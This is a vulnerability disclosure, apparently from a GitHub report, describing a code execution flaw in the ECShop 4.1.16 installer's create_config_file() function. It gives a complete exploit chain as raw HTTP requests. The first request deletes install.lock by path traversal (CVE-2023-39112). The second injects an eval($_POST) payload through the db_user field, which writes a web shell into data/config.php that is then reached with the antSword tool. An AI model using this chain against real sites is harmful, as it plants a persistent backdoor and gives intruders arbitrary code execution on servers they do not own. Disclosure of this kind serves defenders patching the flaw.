# ECShop 4.1.16 Code Execution Vulnerability
## Vulnerability Position
In the create_config_file() function on line 313 of the \source\ecshop\install\includes\lib_installer.php file
```
function create_config_file($db_host, $db_port, $db_user, $db_pass, $db_name, $prefix, $timezone)
{
    global $err, $_LANG;
    $db_host = construct_db_host($db_host, $db_port);

    $content = '<?' ."php\n";
    $content .= "// database host\n";
    $content .= "\$db_host   = \"$db_host\";\n\n";
    $content .= "// database name\n";
    $content .= "\$db_name   = \"$db_name\";\n\n";
    $content .= "// database username\n";
    $content .= "\$db_user   = \"$db_user\";\n\n";
    $content .= "// database password\n";
    $content .= "\$db_pass   = \"$db_pass\";\n\n";
    $content .= "// table prefix\n";
    $content .= "\$prefix    = \"$prefix\";\n\n";
    $content .= "\$timezone    = \"$timezone\";\n\n";
    $content .= "\$cookie_path    = \"/\";\n\n";
    $content .= "\$cookie_domain    = \"\";\n\n";
    $content .= "\$session = \"1440\";\n\n";
    $content .= "define('EC_CHARSET','".EC_CHARSET."');\n\n";
    $content .= "define('ADMIN_PATH','admin');\n\n";
    $content .= "define('AUTH_KEY', 'this is a key');\n\n";
    $content .= "define('OLD_AUTH_KEY', '');\n\n";
    $content .= "define('API_TIME', '');\n\n";
    $content .= "define('STORE_KEY','".md5(microtime() . mt_rand(0,1000))."');\n\n";
    $content .= '?>';


    $fp = @fopen(ROOT_PATH . 'data/config.php', 'wb+');
    if (!$fp)
    {
        $err->add($_LANG['open_config_file_failed']);
        return false;
    }
    if (!@fwrite($fp, trim($content)))
    {
        $err->add($_LANG['write_config_file_failed']);
        return false;
    }
    @fclose($fp);

    return true;
}
```
We control the variable value of $db_host, $db_port, $db_user, $db_pass, $db_name, $prefix, $timezone by constructing these variable values, and write them into the data/config.php file, resulting in arbitrary code execution.
## Vulnerability Verification
In order to achieve the purpose of file writing, we need to use CVE-2023-39112 to delete the specified file. The following is the request packet to delete the file, and the administrator cookie needs to be supplemented.
```
POST /admin/database.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: 
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

act=remove&file[]=../../data/install.lock
```
![image](https://github.com/Luci4n555/vul_report/assets/116565145/edfd2d8c-059c-4586-a133-d71c8a94cd91)

Then we exploit this vulnerability to write malicious code.
```
POST /install/index.php?step=create_database HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Connection: close

db_host=localhost&db_port=3306&db_user=${eval($_POST[123])}&db_pass=&db_name=&lang=zh_cn
```
![image](https://github.com/Luci4n555/vul_report/assets/116565145/d3dd5250-9096-450d-919a-ad28d8384ba2)
Finally we use the antSwordPublic tool to connect and test code execution.
The link address is: http://127.0.0.1/data/config.php, the password is 123.
![image](https://github.com/Luci4n555/vul_report/assets/116565145/2dd54abb-0ee7-4167-a0a6-9e0cc3259624)
Successful execution of arbitrary code.
